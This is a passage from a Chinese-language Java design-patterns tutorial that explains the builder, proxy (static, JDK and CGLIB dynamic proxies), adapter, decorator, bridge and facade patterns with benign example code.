cpu;        this.screen = screen;        this.memory = memory;        this.mainboard = mainboard;    &#125;    public String getCpu() &#123;        return cpu;    &#125;    public void setCpu(String cpu) &#123;        this.cpu = cpu;    &#125;    public String getScreen() &#123;        return screen;    &#125;    public void setScreen(String screen) &#123;        this.screen = screen;    &#125;    public String getMemory() &#123;        return memory;    &#125;    public void setMemory(String memory) &#123;        this.memory = memory;    &#125;    public String getMainboard() &#123;        return mainboard;    &#125;    public void setMainboard(String mainboard) &#123;        this.mainboard = mainboard;    &#125;    @Override    public String toString() &#123;        return &quot;PhoneBefore&#123;&quot; +                &quot;cpu=&#x27;&quot; + cpu + &#x27;\\&#x27;&#x27; +                &quot;, screen=&#x27;&quot; + screen + &#x27;\\&#x27;&#x27; +                &quot;, memory=&#x27;&quot; + memory + &#x27;\\&#x27;&#x27; +                &quot;, mainboard=&#x27;&quot; + mainboard + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n重构后的代码：\npublic class PhoneAfter &#123;    private String cpu;    private String screen;    private String memory;    private String mainboard;    private PhoneAfter(Builder builder) &#123;        this.cpu = builder.cpu;        this.screen = builder.screen;        this.memory = builder.memory;        this.mainboard = builder.mainboard;    &#125;    public static final class Builder&#123;        private String cpu;        private String screen;        private String memory;        private String mainboard;        public Builder() &#123;        &#125;        public Builder cpu(String val) &#123;            cpu = val;            return this;        &#125;        public Builder screen(String val) &#123;            screen = val;            return this;        &#125;        public Builder memory(String val) &#123;            memory = val;            return this;        &#125;        public Builder mainboard(String val) &#123;            mainboard = val;            return this;        &#125;        public PhoneAfter build()&#123;            return new PhoneAfter(this);        &#125;    &#125;    @Override    public String toString() &#123;        return &quot;PhoneAfter&#123;&quot; +                &quot;cpu=&#x27;&quot; + cpu + &#x27;\\&#x27;&#x27; +                &quot;, screen=&#x27;&quot; + screen + &#x27;\\&#x27;&#x27; +                &quot;, memory=&#x27;&quot; + memory + &#x27;\\&#x27;&#x27; +                &quot;, mainboard=&#x27;&quot; + mainboard + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n测试代码：\npublic class Client &#123;    public static void main(String[] args) &#123;        PhoneBefore phoneBefore = new PhoneBefore(&quot;intel&quot;,&quot;华硕&quot;,&quot;金士顿&quot;,&quot;三星&quot;);        PhoneAfter phoneAfter = new PhoneAfter.Builder()                .cpu(&quot;intel&quot;)                .mainboard(&quot;华硕&quot;)                .memory(&quot;金士顿&quot;)                .screen(&quot;三星&quot;)                .build();        System.out.println(phoneBefore);        System.out.println(phoneAfter);    &#125;&#125;\n\n从测试类的代码中可以看出，重构前的代码创建Phone对象时，如果参数过多，代码的可读性较差且使用成本比较高。重构后的代码使用起来更加方便，这种方式也叫链式调用。\n创建者模式对比工厂方法模式VS建造者模式工厂方法模式注重的是整体对象的创建方式；而建造者模式注重的是部件构建的过程，意在通过一步一步地精确构造创建出一个复杂的对象。\n我们举个简单例子来说明两者的差异，如要制造一个超人。如果使用工厂方法模式，直接产生出来的就是一个力大无穷、能够飞翔、内裤外穿的超人；而如果使用建造者模式，则需要组装手、头、脚、躯干等部分，然后再把内裤外穿，于是一个超人就诞生了。\n抽象工厂模式VS建造者模式抽象工厂模式实现对产品家族的创建，一个产品家族是这样的一系列产品：具有不同分类维度的产品组合，采用抽象工厂模式则是不需要关心构建过程，只关心什么产品由什么工厂生产即可。建造者模式则是要求按照指定的蓝图建造产品，它的主要目的是通过组装零配件而产生一个新产品。\n如果将抽象工厂模式看成汽车配件生产工厂，生产一个产品族的产品，那么建造者模式就是一个汽车组装工厂，通过对部件的组装可以返回一辆完整的汽车\n结构型模式结构型模式描述如何将类或对象按某种布局组成更大的结构。它分为类结构型模式和对象结构型模式，前者采用继承机制来组织接口和类，后者釆用组合或聚合来组合对象。由于组合关系或聚合关系比继承关系耦合度低，满足“合成复用原则”，所以对象结构型模式比类结构型模式具有更大的灵活性。\n结构型模式分为以下 7 种：\n\n代理模式\n适配器模式\n装饰者模式\n桥接模式\n外观模式\n组合模式\n享元模式\n\n代理模式概述由于某些原因需要给某对象提供一个代理以控制对该对象的访问。这时，访问对象不适合或者不能直接引用目标对象，代理对象作为访问对象和目标对象之间的中介。Java中的代理按照代理类生成时机不同又分为静态代理和动态代理。静态代理代理类在编译期就生成，而动态代理代理类则是在Java运行时动态生成。动态代理又有JDK代理和CGLib代理两种。\n结构代理（Proxy）模式分为三种角色：\n\n抽象主题（Subject）类： 通过接口或抽象类声明真实主题和代理对象实现的业务方法。\n真实主题（Real Subject）类： 实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。\n代理（Proxy）类 ： 提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。\n\n静态代理例：火车站卖票如果要买火车票的话，需要去火车站买票，坐车到火车站，排队等一系列的操作，显然比较麻烦。而火车站在多个地方都有代售点，我们去代售点买票就方便很多了。这个例子其实就是典型的代理模式，火车站是目标对象，代售点是代理对象。类图如下：\n\nProxyPoint作为访问对象和目标对象的中介。同时也对sell方法进行了增强（代理点收取一些服务费用）。\n//卖票接口public interface SellTickets &#123;    void sell();&#125;//火车站  火车站具有卖票功能，所以需要实现SellTickets接口public class TrainStation implements SellTickets &#123;    public void sell() &#123;        System.out.println(&quot;火车站卖票&quot;);    &#125;&#125;//代售点public class ProxyPoint implements SellTickets &#123;    private TrainStation station = new TrainStation();    public void sell() &#123;        System.out.println(&quot;代理点收取一些服务费用&quot;);        station.sell();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        ProxyPoint pp = new ProxyPoint();        pp.sell();    &#125;&#125;\n\nJDK动态代理Java中提供了一个动态代理类Proxy。Proxy并不是我们上述所说的代理对象的类，而是提供了一个创建代理对象的静态方法（newProxyInstance方法）来获取代理对象。\n代理工厂：用于获取动态代理对象\nimport java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;// 代理工厂，用来创建代理对象public class ProxyFactory &#123;    // 声明目标对象    private TrainStation station = new TrainStation();    public SellTickets getProxyObject() &#123;        //使用Proxy获取代理对象        /*            newProxyInstance()方法参数说明：                ClassLoader loader ： 类加载器，用于加载代理类，使用真实对象的类加载器即可                Class&lt;?&gt;[] interfaces ： 真实对象所实现的接口，代理模式真实对象和代理对象实现相同的接口                InvocationHandler h ： 代理对象的调用处理程序         */        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(                station.getClass().getClassLoader(),                station.getClass().getInterfaces(),                new InvocationHandler() &#123;                    /*                        InvocationHandler中invoke方法参数说明：                            proxy ： 代理对象                            method ： 对应于在代理对象上调用的接口方法的 Method 实例                            args ： 代理对象调用接口方法时传递的实际参数                     */                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                        System.out.println(&quot;代理点收取一些服务费用(JDK动态代理方式)&quot;);                        //执行真实对象                        Object result = method.invoke(station, args);                        return result;                    &#125;                &#125;);        return sellTickets;    &#125;&#125;\n\njdk动态创建的代理类（异常处理等其他无关代码已删除）：\n//程序运行过程中动态生成的代理类public final class $Proxy0 extends Proxy implements SellTickets &#123;    private static Method m3;    public $Proxy0(InvocationHandler invocationHandler) &#123;        super(invocationHandler);    &#125;    static &#123;        m3 = Class.forName(&quot;com.itheima.proxy.dynamic.jdk.SellTickets&quot;).getMethod(&quot;sell&quot;, new Class[0]);    &#125;    public final void sell() &#123;        this.h.invoke(this, m3, null);    &#125;&#125;\n\n执行流程：\n\n通过代理工厂获取动态创建的代理类对象（执行过程中创建的代理类）\n调用代理对象的sell()方法\n根据多态的特性，执行的是代理类（$Proxy0）中的sell()方法\n代理类（$Proxy0）中的sell()方法中又调用了InvocationHandler接口的子实现类对象的invoke方法\ninvoke方法通过反射执行了真实对象所属类(TrainStation)中的sell()方法\n\nCGLIB动态代理如果没有定义SellTickets接口，只定义了TrainStation(火车站类)。很显然JDK代理是无法使用了，因为JDK动态代理要求必须定义接口，对接口进行代理。CGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。CGLIB是第三方提供的包，所以需要引入jar包的坐标：\n&lt;dependency&gt;    &lt;groupId&gt;cglib&lt;/groupId&gt;    &lt;artifactId&gt;cglib&lt;/artifactId&gt;    &lt;version&gt;2.2.2&lt;/version&gt;&lt;/dependency&gt;\n\n\ncglib 是未维护的，在高版本的jdk中是无法正常运行的。目前看来jdk17是不行的（2022-11-24）在jdk8中是正常运行的。（果然还得是8）引发错误似乎与增强器有关，在初始化Enhancer类时会出现：java.lang.ExceptionInInitializerError解决办法：\n\n使用低版本的jdk，比如jdk8\n迁移至 ByteBuddy \nSpring Framework维护了cglib的补丁（包括jdk17的兼容性）。github地址\n\n\n代码如下：\nimport net.sf.cglib.proxy.Enhancer;import net.sf.cglib.proxy.MethodInterceptor;import net.sf.cglib.proxy.MethodProxy;import java.lang.reflect.Method;// 代理对象工厂public class ProxyFactory implements MethodInterceptor &#123;    private TrainStation target = new TrainStation();    public TrainStation getProxyObject() &#123;        //创建Enhancer对象，类似于JDK动态代理的Proxy类，下一步就是设置几个参数        Enhancer enhancer = new Enhancer();        //设置父类的字节码对象        enhancer.setSuperclass(target.getClass());        //设置回调函数        enhancer.setCallback(this);        //创建代理对象        TrainStation obj = (TrainStation) enhancer.create();        return obj;    &#125;    /*        intercept方法参数说明：            o ： 代理对象            method ： 真实对象中的方法的Method实例            args ： 实际参数            methodProxy ：代理对象中的方法的method实例     */    public TrainStation intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable &#123;        System.out.println(&quot;代理点收取一些服务费用(CGLIB动态代理方式)&quot;);        TrainStation result = (TrainStation) methodProxy.invokeSuper(o, args);        return result;    &#125;&#125;\n\n三种代理的对比\njdk代理和CGLIB代理使用CGLib实现动态代理，CGLib底层采用ASM字节码生成框架，使用字节码技术生成代理类，在JDK1.6之前比使用Java反射效率要高。唯一需要注意的是，CGLib不能对声明为final的类或者方法进行代理，因为CGLib原理是动态生成被代理类的子类。在JDK1.6、JDK1.7、JDK1.8逐步对JDK动态代理优化之后，在调用次数较少的情况下，JDK代理效率高于CGLib代理效率，只有当进行大量调用的时候，JDK1.6和JDK1.7比CGLib代理效率低一点，但是到JDK1.8的时候，JDK代理效率高于CGLib代理。所以如果有接口使用JDK动态代理，如果没有接口使用CGLIB代理。\n动态代理和静态代理动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（InvocationHandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。如果接口增加一个方法，静态代理模式除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。而动态代理不会出现该问题\n\n优缺点优点：\n\n代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用；\n代理对象可以扩展目标对象的功能；\n代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度；\n\n缺点：\n\n增加了系统的复杂度；\n\n使用场景\n远程（Remote）代理本地服务通过网络请求远程服务。为了实现本地到远程的通信，我们需要实现网络通信，处理其中可能的异常。为良好的代码设计和可维护性，我们将网络通信部分隐藏起来，只暴露给本地服务一个接口，通过该接口即可访问远程服务提供的功能，而不必过多关心通信部分的细节。（RPC思想，例如 Dubbo框架）\n防火墙（Firewall）代理当你将浏览器配置成使用代理功能时，防火墙就将你的浏览器的请求转给互联网；当互联网返回响应时，代理服务器再把它转给你的浏览器。\n保护（Protect or Access）代理控制对一个对象的访问，如果需要，可以给不同的用户提供不同级别的使用权限。\n\n适配器模式概述如果去欧洲国家去旅游的话，他们的插座如下图最左边，是欧洲标准。而我们使用的插头如下图最右边的。因此我们的笔记本电脑，手机在当地不能直接充电。所以就需要一个插座转换器，转换器第1面插入当地的插座，第2面供我们充电，这样使得我们的插头在当地能使用。生活中这样的例子很多，手机充电器（将220v转换为5v的电压），读卡器等，其实就是使用到了适配器模式。\n\n定义：将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类能一起工作。适配器模式分为类适配器模式和对象适配器模式，前者类之间的耦合度比后者高，且要求程序员了解现有组件库中的相关组件的内部结构，所以应用相对较少些。\n结构适配器模式（Adapter）包含以下主要角色：\n\n目标（Target）接口：当前系统业务所期待的接口，它可以是抽象类或接口。\n适配者（Adaptee）类：它是被访问和适配的现存组件库中的组件接口。\n适配器（Adapter）类：它是一个转换器，通过继承或引用适配者的对象，把适配者接口转换成目标接口，让客户按目标接口的格式访问适配者。\n\n类适配器模式实现方式：定义一个适配器类来实现当前系统的业务接口，同时又继承现有组件库中已经存在的组件。\n例：读卡器现有一台电脑只能读取SD卡，而要读取TF卡中的内容的话就需要使用到适配器模式。创建一个读卡器，将TF卡中的内容读取出来。类图如下：\n代码如下：\n//SD卡的接口public interface SDCard &#123;    //读取SD卡方法    String readSD();    //写入SD卡功能    void writeSD(String msg);&#125;//SD卡实现类public class SDCardImpl implements SDCard &#123;    public String readSD() &#123;        String msg = &quot;sd card read a msg :hello word SD&quot;;        return msg;    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;sd card write msg : &quot; + msg);    &#125;&#125;//电脑类public class Computer &#123;    public String readSD(SDCard sdCard) &#123;        if(sdCard == null) &#123;            throw new NullPointerException(&quot;sd card null&quot;);        &#125;        return sdCard.readSD();    &#125;&#125;//TF卡接口public interface TFCard &#123;    //读取TF卡方法    String readTF();    //写入TF卡功能    void writeTF(String msg);&#125;//TF卡实现类public class TFCardImpl implements TFCard &#123;    public String readTF() &#123;        String msg =&quot;tf card read msg : hello word tf card&quot;;        return msg;    &#125;    public void writeTF(String msg) &#123;        System.out.println(&quot;tf card write a msg : &quot; + msg);    &#125;&#125;//定义适配器类（SD兼容TF）public class SDAdapterTF extends TFCardImpl implements SDCard &#123;    public String readSD() &#123;        System.out.println(&quot;adapter read tf card &quot;);        return readTF();    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;adapter write tf card&quot;);        writeTF(msg);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Computer computer = new Computer();        SDCard sdCard = new SDCardImpl();        System.out.println(computer.readSD(sdCard));        System.out.println(&quot;------------&quot;);        SDAdapterTF adapter = new SDAdapterTF();        System.out.println(computer.readSD(adapter));    &#125;&#125;\n\n类适配器模式违背了合成复用原则。类适配器是客户类有一个接口规范的情况下可用，反之不可用。\n对象适配器模式实现方式：对象适配器模式可釆用将现有组件库中已经实现的组件引入适配器类中，该类同时实现当前系统的业务接口。\n例：读卡器我们使用对象适配器模式将读卡器的案例进行改写。类图如下：\n\n代码如下：类适配器模式的代码，我们只需要修改适配器类（SDAdapterTF）和测试类。\n//创建适配器对象（SD兼容TF）public class SDAdapterTF  implements SDCard &#123;    private TFCard tfCard;    public SDAdapterTF(TFCard tfCard) &#123;        this.tfCard = tfCard;    &#125;    public String readSD() &#123;        System.out.println(&quot;adapter read tf card &quot;);        return tfCard.readTF();    &#125;    public void writeSD(String msg) &#123;        System.out.println(&quot;adapter write tf card&quot;);        tfCard.writeTF(msg);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Computer computer = new Computer();        SDCard sdCard = new SDCardImpl();        System.out.println(computer.readSD(sdCard));        System.out.println(&quot;------------&quot;);        TFCard tfCard = new TFCardImpl();        SDAdapterTF adapter = new SDAdapterTF(tfCard);        System.out.println(computer.readSD(adapter));    &#125;&#125;\n\n\n注意：还有一个适配器模式是接口适配器模式。当不希望实现一个接口中所有的方法时，可以创建一个抽象类Adapter ，实现所有方法。而此时我们只需要继承该抽象类即可。\n\n应用场景\n以前开发的系统存在满足新系统功能需求的类，但其接口同新系统的接口不一致。\n使用第三方提供的组件，但组件接口定义和自己要求的接口定义不同。\n\n主要是接口不同，根据开闭原则，尽可能不要修改之前的系统，而是通过适配器进行新旧系统的对接。\n类适配器和对象适配器的区别\n对象适配器持有目标适配者的对象，是动态的方式；而类适配器通过继承目标适配者类，实现适配，是静态的方式。\n对象适配器采用动态的方式与目标适配者链结，所以它可以对不同的目标适配者及其子类进行适配。\n类适配器可以重新定义实现行为（重写覆盖），而对象适配器则比较困难，但添加行为比较方便。\n\n尽量使用对象适配器遵循合成复用原则，多合成（接口）&#x2F;聚合，少继承。\nJDK中的应用（InputStreamReader）Reader（字符流）、InputStream（字节流）的适配使用的是InputStreamReader。InputStreamReader继承自java.io包中的Reader，对他中的抽象的未实现的方法给出实现。如：\npublic int read() throws IOException &#123;    return sd.read();&#125;public int read(char cbuf[], int offset, int length) throws IOException &#123;    return sd.read(cbuf, offset, length);&#125;\n\n如上代码中的sd（StreamDecoder类对象），在Sun的JDK实现中，实际的方法实现是对sun.nio.cs.StreamDecoder类的同名方法的调用封装。类结构图如下：\n\n从上图可以看出：\n\nInputStreamReader是对同样实现了Reader的StreamDecoder的封装。\nStreamDecoder不是Java SE API中的内容，是Sun JDK给出的自身实现。但我们知道他们对构造方法中的字节流类（InputStream）进行封装，并通过该类进行了字节流和字符流之间的解码转换。\n\n结论：从表层来看，InputStreamReader做了InputStream字节流类到Reader字符流之间的转换。而从如上Sun JDK中的实现类关系结构中可以看出，是StreamDecoder的设计实现在实际上采用了适配器模式。\n装饰者模式概述我们先来看一个快餐店的例子。快餐店有炒面、炒饭这些快餐，可以额外附加鸡蛋、火腿、培根这些配菜，当然加配菜需要额外加钱，每个配菜的价钱通常不太一样，那么计算总价就会显得比较麻烦。\n\n使用继承的方式存在的问题：\n\n扩展性不好如果要再加一种配料（火腿肠），我们就会发现需要给FriedRice和FriedNoodles分别定义一个子类。如果要新增一个快餐品类（炒河粉）的话，就需要定义更多的子类。\n产生过多的子类\n\n定义：指在不改变现有对象结构的情况下，动态地给该对象增加一些职责（即增加其额外功能）的模式。\n结构装饰（Decorator）模式中的角色：\n\n抽象构件（Component）角色 ：定义一个抽象接口以规范准备接收附加责任的对象。\n具体构件（Concrete Component）角色 ：实现抽象构件，通过装饰角色为其添加一些职责。\n抽象装饰（Decorator）角色 ： 继承或实现抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能。\n具体装饰（ConcreteDecorator）角色 ：实现抽象装饰的相关方法，并给具体构件对象添加附加的责任。\n\n案例我们使用装饰者模式对快餐店案例进行改进，体会装饰者模式的精髓。\n类图如下：\n代码如下：\n//快餐接口public abstract class FastFood &#123;    private float price;    private String desc;    public FastFood() &#123;    &#125;    public FastFood(float price, String desc) &#123;        this.price = price;        this.desc = desc;    &#125;    public void setPrice(float price) &#123;        this.price = price;    &#125;    public float getPrice() &#123;        return price;    &#125;    public String getDesc() &#123;        return desc;    &#125;    public void setDesc(String desc) &#123;        this.desc = desc;    &#125;    public abstract float cost();  //获取价格&#125;//炒饭public class FriedRice extends FastFood &#123;    public FriedRice() &#123;        super(10, &quot;炒饭&quot;);    &#125;    public float cost() &#123;        return getPrice();    &#125;&#125;//炒面public class FriedNoodles extends FastFood &#123;    public FriedNoodles() &#123;        super(12, &quot;炒面&quot;);    &#125;    public float cost() &#123;        return getPrice();    &#125;&#125;//配料类public abstract class Garnish extends FastFood &#123;    private FastFood fastFood;    public FastFood getFastFood() &#123;        return fastFood;    &#125;    public void setFastFood(FastFood fastFood) &#123;        this.fastFood = fastFood;    &#125;    public Garnish(FastFood fastFood, float price, String desc) &#123;        super(price,desc);        this.fastFood = fastFood;    &#125;&#125;//鸡蛋配料public class Egg extends Garnish &#123;    public Egg(FastFood fastFood) &#123;        super(fastFood,1,&quot;鸡蛋&quot;);    &#125;    public float cost() &#123;        return getPrice() + getFastFood().getPrice();    &#125;    @Override    public String getDesc() &#123;        return super.getDesc() + getFastFood().getDesc();    &#125;&#125;//培根配料public class Bacon extends Garnish &#123;    public Bacon(FastFood fastFood) &#123;        super(fastFood,2,&quot;培根&quot;);    &#125;    @Override    public float cost() &#123;        return getPrice() + getFastFood().getPrice();    &#125;    @Override    public String getDesc() &#123;        return super.getDesc() + getFastFood().getDesc();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //点一份炒饭        FastFood food = new FriedRice();        //花费的价格        System.out.println(food.getDesc() + &quot; &quot; + food.cost() + &quot;元&quot;);        System.out.println(&quot;========&quot;);        //点一份加鸡蛋的炒饭        FastFood food1 = new FriedRice();        food1 = new Egg(food1);        //花费的价格        System.out.println(food1.getDesc() + &quot; &quot; + food1.cost() + &quot;元&quot;);        System.out.println(&quot;========&quot;);        //点一份加培根的炒面        FastFood food2 = new FriedNoodles();        food2 = new Bacon(food2);        //花费的价格        System.out.println(food2.getDesc() + &quot; &quot; + food2.cost() + &quot;元&quot;);    &#125;&#125;\n\n好处：\n\n饰者模式可以带来比继承更加灵活性的扩展功能，使用更加方便，可以通过组合不同的装饰者对象来获取具有不同行为状态的多样化的结果。装饰者模式比继承更具良好的扩展性，完美地遵循开闭原则，继承是静态的附加责任，装饰者则是动态的附加责任。\n装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。\n\n缺点：\n\n多层装饰比较复杂，提高了系统的复杂度。不利于我们调试。\n\n使用场景\n当不能采用继承的方式对系统进行扩充或者采用继承不利于系统扩展和维护时。不能采用继承的情况主要有两类：\n第一类是系统中存在大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长；\n第二类是因为类定义不能继承（如final类）\n\n\n在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。\n当对象的功能要求可以动态地添加，也可以再动态地撤销时。\n\nJDK中的应用（IO流）IO流中的包装类使用到了装饰者模式。BufferedInputStream，BufferedOutputStream，BufferedReader，BufferedWriter。我们以BufferedWriter举例来说明，先看看如何使用BufferedWriter\npublic class Client &#123;    public static void main(String[] args) throws Exception&#123;        //创建BufferedWriter对象        //创建FileWriter对象        FileWriter fw = new FileWriter(&quot;C:\\\\Users\\\\Think\\\\Desktop\\\\a.txt&quot;);        BufferedWriter bw = new BufferedWriter(fw);        //写数据        bw.write(&quot;hello Buffered&quot;);        bw.close();    &#125;&#125;\n\n使用起来感觉确实像是装饰者模式，接下来看它们的结构：\n\n\nBufferedWriter使用装饰者模式对Writer子实现类进行了增强，添加了缓冲区，提高了写数据的效率。\n\n代理和装饰者的区别静态代理和装饰者模式的区别：\n\n相同点：\n都要实现与目标类相同的业务接口\n在两个类中都要声明目标对象\n都可以在不修改目标类的前提下增强目标方法\n\n\n不同点：\n目的不同装饰者是为了增强目标对象静态代理是为了保护和隐藏目标对象\n获取目标对象构建的地方不同装饰者是由外界传递进来，可以通过构造方法传递静态代理是在代理类内部创建，以此来隐藏目标对象\n\n\n\n桥接模式概述现在有一个需求，需要创建不同的图形，并且每个图形都有可能会有不同的颜色。我们可以利用继承的方式来设计类的关系：\n\n我们可以发现有很多的类，假如我们再增加一个形状或再增加一种颜色，就需要创建更多的类。试想，在一个有多种可能会变化的维度的系统中，用继承方式会造成类爆炸，扩展起来不灵活。每次在一个维度上新增一个具体实现都要增加多个子类。为了更加灵活的设计系统，我们此时可以考虑使用桥接模式。\n定义：将抽象与实现分离，使它们可以独立变化。它是用组合关系代替继承关系来实现，从而降低了抽象和实现这两个可变维度的耦合度。\n结构桥接（Bridge）模式包含以下主要角色：\n\n抽象化（Abstraction）角色 ：定义抽象类，并包含一个对实现化对象的引用。\n扩展抽象化（Refined  Abstraction）角色 ：是抽象化角色的子类，实现父类中的业务方法，并通过组合关系调用实现化角色中的业务方法。\n实现化（Implementor）角色 ：定义实现化角色的接口，供扩展抽象化角色调用。\n具体实现化（Concrete Implementor）角色 ：给出实现化角色接口的具体实现。\n\n案例例：视频播放器需要开发一个跨平台视频播放器，可以在不同操作系统平台（如Windows、Mac、Linux等）上播放多种格式的视频文件，常见的视频格式包括RMVB、AVI、WMV等。该播放器包含了两个维度，适合使用桥接模式。\n类图如下：\n代码如下：\n//视频文件public interface VideoFile &#123;    void decode(String fileName);&#125;//avi文件public class AVIFile implements VideoFile &#123;    public void decode(String fileName) &#123;        System.out.println(&quot;avi视频文件：&quot;+ fileName);    &#125;&#125;//rmvb文件public class REVBBFile implements VideoFile &#123;    public void decode(String fileName) &#123;        System.out.println(&quot;rmvb文件：&quot; + fileName);    &#125;&#125;//操作系统版本public abstract class OperatingSystemVersion &#123;    protected VideoFile videoFile;    public OperatingSystemVersion(VideoFile videoFile) &#123;        this.videoFile = videoFile;    &#125;    public abstract void play(String fileName);&#125;//Windows版本public class Windows extends OperatingSystemVersion &#123;    public Windows(VideoFile videoFile) &#123;        super(videoFile);    &#125;    public void play(String fileName) &#123;        videoFile.decode(fileName);    &#125;&#125;//mac版本public class Mac extends OperatingSystemVersion &#123;    public Mac(VideoFile videoFile) &#123;        super(videoFile);    &#125;    public void play(String fileName) &#123;\t\tvideoFile.decode(fileName);    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;       OperatingSystemVersion os = new Windows(new AVIFile());        os.play(&quot;战狼3&quot;);    &#125;&#125;\n\n好处：\n\n桥接模式提高了系统的可扩充性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统。如：如果现在还有一种视频文件类型wmv，我们只需要再定义一个类实现VideoFile接口即可，其他类不需要发生变化。\n实现细节对客户透明\n\n使用场景\n当一个类存在两个独立变化的维度，且这两个维度都需要进行扩展时。\n当一个系统不希望使用继承或因为多层次继承导致系统类的个数急剧增加时。\n当一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性时。避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。\n\n外观模式概述有些人可能炒过股票，但其实大部分人都不太懂，这种没有足够了解证券知识的情况下做股票是很容易亏钱的，刚开始炒股肯定都会想，如果有个懂行的帮帮手就好.其实基金就是个好帮手，支付宝里就有许多的基金，它将投资者分散的资金集中起来，交由专业的经理人进行管理，投资于股票、债券、外汇等领域，而基金投资的收益归持有者所有，管理机构收取一定比例的托管管理费用。\n定义：又名门面模式，是一种通过为多个复杂的子系统提供一个一致的接口，而使这些子系统更加容易被访问的模式。该模式对外有一个统一接口，外部应用程序不用关心内部子系统的具体的细节，这样会大大降低应用程序的复杂度，提高了程序的可维护性。\n外观（Facade）模式是“迪米特法则”的典型应用\n\n结构外观（Facade）模式包含以下主要角色：\n\n外观（Facade）角色：为多个子系统对外提供一个共同的接口。\n子系统（Sub System）角色：实现系统的部分功能，客户可以通过外观角色访问它。\n\n案例例：智能家电控制小明的爷爷已经60岁了，一个人在家生活：每次都需要打开灯、打开电视、打开空调；睡觉时关闭灯、关闭电视、关闭空调；操作起来都比较麻烦。所以小明给爷爷买了智能音箱，可以通过语音直接控制这些智能家电的开启和关闭。类图如下：\n\n代码如下：\n//灯类public class Light &#123;    public void on() &#123;        System.out.println(&quot;打开了灯....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了灯....&quot;);    &#125;&#125;//电视类public class TV &#123;    public void on() &#123;        System.out.println(&quot;打开了电视....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了电视....&quot;);    &#125;&#125;//控制类public class AirCondition &#123;    public void on() &#123;        System.out.println(&quot;打开了空调....&quot;);    &#125;    public void off() &#123;        System.out.println(&quot;关闭了空调....&quot;);    &#125;&#125;//智能音箱public class SmartAppliancesFacade &#123;    private Light light;    private TV tv;    private AirCondition airCondition;    public SmartAppliancesFacade() &#123;        light = new Light();        tv = new TV();        airCondition = new AirCondition();    &#125;    public void say(String message) &#123;        if(message.contains(&quot;打开&quot;)) &#123;            on();        &#125; else if(message.contains(&quot;关闭&quot;)) &#123;            off();        &#125; else &#123;            System.out.println(&quot;我还听不懂你说的！！！&quot;);        &#125;    &#125;    //起床后一键开电器    private void on() &#123;        System.out.println(&quot;起床了&quot;);        light.on();        tv.on();        airCondition.on();    &#125;    //睡觉一键关电器    private void off() &#123;        System.out.println(&quot;睡觉了&quot;);        light.off();        tv.off();        airCondition.off();    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        //创建外观对象        SmartAppliancesFacade facade = new SmartAppliancesFacade();        //客户端直接与外观对象进行交互        facade.say(&quot;打开家电&quot;);        facade.say(&quot;关闭家电&quot;);    &#125;&#125;\n\n好处：\n\n降低了子系统与客户端之间的耦合度，使得子系统的变化不会影响调用它的客户类。\n对客户屏蔽了子系统组件，减少了客户处理的对象数目，并使得子系统使用起来更加容易。\n\n缺点：\n\n不符合开闭原则，修改很麻烦\n\n使用场景\n对分层结构系统构建时，使用外观模式定义子系统中每层的入口点可以简化子系统之间的依赖关系。\n当一个复杂系统的子系统很多时，外观模式可以为系统设计一个简单的接口供外界访问。\n当客户端与多个子系统之间存在很大的联系时，引入外观模式可将它们分离，从而提高子系统的独立性和可移植性。\n\n源码解析使用tomcat作为web容器时，接收浏览器发送过来的请求，tomcat会将请求信息封装成ServletRequest对象，如下图①处对象。但是大家想想ServletRequest是一个接口，它还有一个子接口HttpServletRequest，而我们知道该request对象肯定是一个HttpServletRequest对象的子实现类对象，到底是哪个类的对象呢？可以通过输出request对象，我们就会发现是一个名为RequestFacade的类的对象。\n\nRequestFacade类就使用了外观模式。先看结构图：\n\n为什么在此处使用外观模式呢？定义 RequestFacade 类，分别实现 ServletRequest 和 HttpServletRequest ，同时定义私有成员变量 Request ，并且方法的实现调用 Request  的实现。然后，将 RequestFacade上转为 ServletRequest  传给 servlet 的 service 方法，这样即使在 servlet 中被下转为 RequestFacade ，也不能访问私有成员变量对象中的方法。既用了 Request 